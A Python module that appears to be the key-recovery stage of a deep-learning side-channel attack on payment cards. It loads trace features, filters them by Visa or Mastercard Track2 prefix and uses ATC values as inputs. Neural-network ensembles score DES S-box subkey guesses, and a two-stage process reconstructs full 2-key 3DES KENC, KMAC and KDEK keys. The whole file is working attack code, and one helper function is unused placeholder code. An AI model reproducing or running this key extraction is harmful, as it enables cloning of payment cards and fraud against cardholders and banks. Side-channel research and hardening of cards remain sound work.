import os
from typing import Dict, List, Optional

import numpy as np
import pandas as pd
import torch
import torch.nn.functional as F

from src.model_zaid import get_model
from src.utils import setup_logger
from src.crypto import (
    E_TABLE,
    IP,
    _SBOX,
    apply_permutation,
    compute_batch_des,
    reconstruct_key_from_rk1,
    reconstruct_key_from_rk16,
)

logger = setup_logger("inference_3des")


def _load_stage_features(processed_dir: str, stage: int) -> np.ndarray:
    if stage == 1:
        p = os.path.join(processed_dir, "X_features_s1.npy")
        if not os.path.exists(p):
            p = os.path.join(processed_dir, "X_features.npy")
        return np.load(p).astype(np.float32)
    if stage == 2:
        p = os.path.join(processed_dir, "X_features_s2.npy")
        return np.load(p).astype(np.float32)
    raise ValueError("stage must be 1 or 2")


def _load_norm(model_dir: str, stage: int) -> Optional[tuple[np.ndarray, np.ndarray]]:
    mean_p = os.path.join(model_dir, f"mean_s{stage}.npy")
    std_p = os.path.join(model_dir, f"std_s{stage}.npy")
    if os.path.exists(mean_p) and os.path.exists(std_p):
        return np.load(mean_p), np.load(std_p)
    return None


def _normalize(X: np.ndarray, norm: Optional[tuple[np.ndarray, np.ndarray]]) -> np.ndarray:
    if norm is None:
        mean = np.mean(X, axis=0)
        std = np.std(X, axis=0)
        std[std == 0] = 1
        return (X - mean) / std
    mean, std = norm
    std = np.array(std, copy=True)
    std[std == 0] = 1
    return (X - mean) / std


def _card_mask(df: pd.DataFrame, card_type: str) -> np.ndarray:
    """
    Return a boolean mask selecting rows matching `card_type`.

    Important: We must use the *same* selection for stage-1 and stage-2 features. Returning
    a mask (instead of resetting indices) prevents subtle misalignment bugs when the processed
    directory contains a mix of Visa/Mastercard traces.
    """
    n = len(df)
    if not card_type or card_type.lower() == "universal":
        return np.ones(n, dtype=bool)

    target = card_type.lower()
    t2 = df.get("Track2", pd.Series([""] * n)).astype(str).str.strip().str.upper()
    if target == "mastercard":
        return t2.str.startswith("5").to_numpy()
    if target == "visa":
        return t2.str.startswith("4").to_numpy()
    return np.ones(n, dtype=bool)


def _challenge_ints_from_meta(df: pd.DataFrame) -> np.ndarray:
    # Build 64-bit input block int from ATC_0..ATC_7 columns (already padded by ingest).
    vals = []
    for _, row in df.iterrows():
        b = []
        for j in range(8):
            try:
                b.append(int(row.get(f"ATC_{j}", 0)))
            except Exception:
                try:
                    b.append(int(str(row.get(f"ATC_{j}", 0)), 16))
                except Exception:
                    b.append(0)
        vals.append(int.from_bytes(bytes(b), "big"))
    return np.array(vals, dtype=np.uint64)


def _expanded_r0(block_ints: np.ndarray) -> np.ndarray:
    er0_list = []
    for v in block_ints.tolist():
        ip = apply_permutation(int(v), IP, width=64)
        r0 = ip & 0xFFFFFFFF
        er0 = apply_permutation(r0, E_TABLE, width=32)
        er0_list.append(er0)
    return np.array(er0_list, dtype=np.uint64)


def _load_models_for(model_dir: str, key_type: str, stage: int, sbox_idx_1based: int, device: torch.device) -> List[torch.nn.Module]:
    # New layout: {model_dir}/3des/{key_type}/s{stage}/sbox{s}_model{i}.pth
    base = os.path.join(model_dir, "3des", key_type.lower(), f"s{stage}")
    models: List[torch.nn.Module] = []
    if os.path.isdir(base):
        for fname in sorted(os.listdir(base)):
            if not fname.startswith(f"sbox{sbox_idx_1based}_model") or not fname.endswith(".pth"):
                continue
            path = os.path.join(base, fname)
            model = get_model(input_dim=None, num_classes=16)  # input_dim patched below
            # Create proper model with known dim at call site by re-instantiating
            models.append((path, model))  # placeholder

    # Backward compat: flat naming in model_dir (stage1 only).
    if not models and stage == 1:
        for fname in sorted(os.listdir(model_dir)):
            if fname == f"sbox{sbox_idx_1based}_model0.pth" or fname.startswith(f"sbox{sbox_idx_1based}_model"):
                if fname.endswith(".pth"):
                    models.append((os.path.join(model_dir, fname), None))

    loaded: List[torch.nn.Module] = []
    for path, _ in models:
        loaded.append((path, None))
    return [m for m in loaded]


def _ensemble_avg_probs(X: np.ndarray, model_paths: List[str], device: torch.device) -> np.ndarray:
    # Build & load models with correct input_dim.
    models = []
    for p in model_paths:
        model = get_model(input_dim=X.shape[1], num_classes=16).to(device)
        model.load_state_dict(torch.load(p, map_location=device))
        model.eval()
        models.append(model)

    bx = torch.from_numpy(X).float().to(device)
    with torch.no_grad():
        preds = []
        for m in models:
            out = m(bx)
            preds.append(F.softmax(out, dim=1).cpu().numpy())
        avg = np.mean(preds, axis=0)
    return np.clip(avg, 1e-15, 1.0)


def _score_subkey(avg_probs: np.ndarray, er0_arr: np.ndarray, sbox_idx_1based: int) -> int:
    # For each 6-bit key guess, compute S-box output and sum log-probs.
    key_scores = np.zeros(64, dtype=np.float64)
    shift = 42 - ((sbox_idx_1based - 1) * 6)
    er0_chunk = (er0_arr >> shift) & 0x3F

    sbox_table = _SBOX[sbox_idx_1based - 1]
    for k_guess in range(64):
        sbox_in = er0_chunk ^ k_guess
        b1 = (sbox_in >> 5) & 1
        b6 = sbox_in & 1
        row = (b1 << 1) | b6
        col = (sbox_in >> 1) & 0xF
        sbox_outputs = np.array([sbox_table[int(r * 16 + c)] for r, c in zip(row, col)], dtype=np.int64)
        vals = avg_probs[np.arange(avg_probs.shape[0]), sbox_outputs]
        key_scores[k_guess] = np.sum(np.log(vals))
    return int(np.argmax(key_scores))


def recover_3des_keys(processed_dir: str, model_dir: str, card_type: str = "universal", n_attack: int = 5000) -> Dict[str, str]:
    """
    Pure-ML 2-stage recovery for 16-byte 2-key TDEA keys:
    - Stage 1 recovers K1 via RK1
    - Stage 2 recovers K2 via RK16 using input = DES_enc(K1, block)
    Returns dict with 16-byte hex keys (32 hex chars) for each of KENC/KMAC/KDEK.
    """
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")

    meta_path = os.path.join(processed_dir, "Y_meta.csv")
    if not os.path.exists(meta_path):
        raise FileNotFoundError(f"Missing metadata: {meta_path}")

    df0 = pd.read_csv(meta_path)

    X1 = _load_stage_features(processed_dir, stage=1)
    mask = _card_mask(df0, card_type)
    df = df0.loc[mask].reset_index(drop=True)
    X1 = X1[mask]
    if len(df) == 0 or len(X1) == 0:
        return {}

    X1 = _normalize(X1, _load_norm(model_dir, stage=1))
    n = min(n_attack, len(X1))

    challenges = _challenge_ints_from_meta(df.iloc[:n])
    er0_s1 = _expanded_r0(challenges)

    out: Dict[str, str] = {}

    for key_type in ["kenc", "kmac", "kdek"]:
        # --- Stage 1: recover K1 ---
        winners_s1: List[int] = []
        for sbox_idx in range(1, 9):
            base = os.path.join(model_dir, "3des", key_type, "s1")
            if os.path.isdir(base):
                model_paths = [
                    os.path.join(base, f)
                    for f in sorted(os.listdir(base))
                    if f.startswith(f"sbox{sbox_idx}_model") and f.endswith(".pth")
                ]
            else:
                # Backward compatibility: some earlier deliveries only trained a single flat set
                # of stage-1 models (implicitly for KENC). Do NOT reuse that flat layout for
                # KMAC/KDEK, otherwise we silently output garbage.
                if key_type != "kenc":
                    model_paths = []
                else:
                    model_paths = [
                        os.path.join(model_dir, f)
                        for f in sorted(os.listdir(model_dir))
                        if f.startswith(f"sbox{sbox_idx}_model") and f.endswith(".pth")
                    ]
            if not model_paths:
                winners_s1 = []
                break
            probs = _ensemble_avg_probs(X1[:n], model_paths, device)
            winners_s1.append(_score_subkey(probs, er0_s1, sbox_idx))

        if not winners_s1:
            continue

        k1_int = reconstruct_key_from_rk1(winners_s1)
        k1_hex = f"{k1_int:016X}"

        # --- Stage 2: recover K2 ---
        try:
            X2 = _load_stage_features(processed_dir, stage=2)
        except Exception:
            continue

        X2 = _normalize(X2, _load_norm(model_dir, stage=2))
        # Apply the exact same trace selection used for stage 1.
        if len(X2) != len(df0):
            logger.warning("Stage-2 features length (%d) != metadata length (%d); skipping stage-2 for %s.", len(X2), len(df0), key_type)
            continue
        X2 = X2[mask]
        X2n = X2[:n]

        # Compute C1 = DES_enc(K1, challenge) for each trace.
        c1_ints = compute_batch_des(challenges.tolist(), k1_hex, mode="encrypt")
        er0_s2 = _expanded_r0(np.array(c1_ints, dtype=np.uint64))

        winners_s2: List[int] = []
        base2 = os.path.join(model_dir, "3des", key_type, "s2")
        for sbox_idx in range(1, 9):
            if os.path.isdir(base2):
                model_paths2 = [
                    os.path.join(base2, f)
                    for f in sorted(os.listdir(base2))
                    if f.startswith(f"sbox{sbox_idx}_model") and f.endswith(".pth")
                ]
            else:
                model_paths2 = []
            if not model_paths2:
                winners_s2 = []
                break
            probs2 = _ensemble_avg_probs(X2n, model_paths2, device)
            winners_s2.append(_score_subkey(probs2, er0_s2, sbox_idx))

        if not winners_s2:
            continue

        k2_int = reconstruct_key_from_rk16(winners_s2)
        k2_hex = f"{k2_int:016X}"

        out[f"3DES_{key_type.upper()}"] = f"{k1_hex}{k2_hex}"

    return out
